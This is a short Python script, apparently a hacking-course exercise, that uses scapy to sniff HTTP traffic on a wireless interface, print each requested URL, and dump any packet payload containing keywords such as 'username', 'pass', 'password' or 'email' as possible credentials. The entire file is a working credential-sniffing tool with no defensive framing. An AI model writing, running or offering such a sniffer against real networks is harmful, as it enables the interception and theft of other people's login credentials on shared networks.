#!/usr/bin/env python
import scapy.all as scapy
# third party linking scapy-http
from scapy.layers import http

def sniff(interface):
    # iface is interface
    # store - not to store packet's in memory
    # prn - callback function
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet.load)  # packet[scapy.Raw].load
        key = ["username", "uname", "login", "pass", "password", "email", "u","Username","Password1"]
        for keys in key:
            if keys in load:
                return load

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("+ HTTP REQUEST :  " + url.decode())
        login_info = get_login(packet)
        if login_info:
            print("\n\n+ Possible username/password " + login_info + "\n\n")



sniff("wlan0")
